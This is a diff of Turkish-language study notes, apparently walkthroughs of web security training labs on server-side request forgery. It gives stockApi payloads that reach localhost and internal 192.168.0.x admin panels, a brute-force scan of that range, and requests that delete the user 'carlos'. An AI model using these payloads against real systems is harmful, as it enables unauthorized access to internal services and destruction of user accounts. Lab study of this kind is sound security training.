@@ -10,3 +10,12 @@ stockApi=http://localhost/admin yazılır send ve admin paneline girilir.
 response üzerinden carlos kullanıcısını nasıl silebileceğimizi de görebiliyoruz.
 KULLANICI SİLMEK İÇİN PAYLOAD
 StockApi= http://localhost/admin/delete?username=carlos
+
+
+2
+
+Laboratuvar: Başka bir arka uç sisteme karşı temel SSRF
+ilk olarak stockApi=http://192.168.0.$1$:8080/admin payloadını yükleyip intruderden 1 parametresine 1-255 arası değer verip 200 dönene kadar bruteforce yapıyoruz. 
+207 açıksa 192.168.0.207:8080/admin ile giriş yapıyoruz.
+sonra final kullanıcı silme işlemi
+stockApi=http://192.168.0.207:8080/admin/delete?username=carlos
